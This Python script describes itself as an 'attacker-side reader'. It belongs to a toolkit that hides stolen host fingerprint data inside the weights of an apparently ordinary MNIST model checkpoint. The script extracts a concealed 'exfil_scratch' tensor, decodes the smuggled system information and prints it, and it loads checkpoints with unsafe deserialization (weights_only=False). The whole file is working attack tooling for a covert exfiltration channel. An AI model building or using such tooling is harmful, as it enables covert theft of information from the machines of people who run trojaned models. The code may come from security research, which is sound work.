"""Recover staged host fingerprint from saved weights (attacker-side reader)."""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import torch

from pytorch_encoder.exfil_machine import COUNTER_BITS, _bits_to_int
from pytorch_encoder.paths import OUTPUTS
from pytorch_encoder.sysinfo_payload import decode_json_from_bits
from pytorch_encoder.weight_vm.interpreter import read_output_from_theta
from pytorch_encoder.weight_vm.layout import DEFAULT_LAYOUT


def decode(checkpoint: Path) -> dict:
    blob = torch.load(checkpoint, map_location="cpu", weights_only=False)
    state = blob["model_state_dict"]
    scratch = state["exfil_scratch"].flatten()

    if blob.get("manifest", {}).get("format") == "weight_vm_v1":
        raw = read_output_from_theta(scratch, DEFAULT_LAYOUT)
        return json.loads(raw.decode("utf-8"))

    cursor = _bits_to_int(scratch[:COUNTER_BITS])
    bits = scratch[COUNTER_BITS : COUNTER_BITS + cursor]
    return decode_json_from_bits(bits)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "checkpoint",
        type=Path,
        default=OUTPUTS / "mnist_cnn_with_exfil.pt",
        nargs="?",
    )
    args = parser.parse_args()
    record = decode(args.checkpoint)
    print(json.dumps(record, indent=2))


if __name__ == "__main__":
    main()
